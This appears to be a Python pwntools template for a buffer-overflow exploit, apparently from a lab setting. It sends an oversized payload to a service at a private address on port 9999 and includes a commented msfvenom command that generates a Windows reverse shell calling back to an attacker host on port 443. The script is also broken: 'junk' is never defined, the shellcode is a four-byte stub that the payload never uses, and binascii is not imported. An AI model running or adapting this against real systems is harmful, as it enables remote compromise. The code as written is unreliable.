#!/usr/bin/python3

# ============================================
# Title of exploit
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"COMMAND"  # this should cause the crash
crash = 3000  # a payload of this size triggers the crash


# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("be3c4638")

payload = b"".join([
    vulncmd,
    junk
])

payload += b"C" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[+] Payload sent!")
s.close()


